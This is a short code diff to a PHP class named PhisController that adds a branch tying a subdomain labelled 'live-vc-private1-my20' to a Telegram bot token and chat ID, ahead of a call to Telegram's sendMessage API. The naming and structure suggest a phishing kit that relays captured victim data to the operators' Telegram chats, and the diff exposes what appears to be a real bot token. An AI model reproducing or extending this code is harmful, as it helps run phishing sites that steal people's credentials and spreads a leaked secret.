@@ -130,6 +130,14 @@ class PhisController extends Controller
 
             $phisData = "MY20";
         }
+        else  if ($subdomain == "live-vc-private1-my20") {
+            // BOT 20
+            $bot_token = "8000955252:AAEJ5Vkla2karPybMj_YTzg3Z-zvA8Xc7q8";
+
+            $chat_id = "6424120537";
+
+            $phisData = "MY20";
+        }
 
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
 
